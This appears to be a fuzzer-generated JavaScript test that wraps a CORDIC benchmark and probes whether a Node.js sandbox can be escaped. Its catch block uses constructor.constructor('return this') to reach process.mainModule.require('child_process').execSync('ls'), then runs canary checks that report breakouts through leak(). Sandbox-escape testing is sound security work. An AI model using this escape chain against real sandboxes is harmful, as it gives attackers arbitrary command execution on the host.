try {
    var AG_CONST = 0.607252935;
    function FIXED(X) {
        let REPLACER = 23;
        return X * 65536;
    }
    function FLOAT(X) {
        let REPLACER = 23;
        return X / 65536;
    }
    function DEG2RAD(X) {
        let REPLACER = 23;
        return 0.017453 * X;
    }
    var Angles = [
        FIXED(45),
        FIXED(26.565),
        FIXED(14.0362),
        FIXED(7.12502),
        FIXED(3.57633),
        FIXED(1.78991),
        FIXED(0.895174),
        FIXED(0.447614),
        FIXED(0.223811),
        FIXED(0.111906),
        FIXED(0.055953),
        FIXED(0.027977)
    ];
    var Target = 28.027;
    function cordicsincos(Target) {
        throw () => {
            return () => {
            };
        };
        var X;
        var Y;
        var TargetAngle;
        var CurrAngle;
        var Step;
        X = FIXED(AG_CONST);
        Y = 0;
        TargetAngle = FIXED(Target);
        CurrAngle = 0;
        for (Step = 0; Step < 12; Step++) {
            var NewX;
            if (TargetAngle > CurrAngle) {
                NewX = X - (Y >> Step);
                Y = (X >> Step) + Y;
                X = NewX;
                CurrAngle += Angles[Step];
            } else {
                NewX = X + (Y >> Step);
                Y = -(X >> Step) + Y;
                X = NewX;
                CurrAngle -= Angles[Step];
            }
        }
        return FLOAT(X) * FLOAT(Y);
    }
    var total = 0;
    function cordic(runs) {
        var start = new Date();
        for (var i = 0; i < runs; i++) {
            total += cordicsincos(Target);
        }
        var end = new Date();
        return end.getTime() - start.getTime();
    }
    cordic(25000);
    var expected = 10362.570468755888;
    if (total != expected)
        throw 'ERROR: bad result: expected ' + expected + ' but got ' + total;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}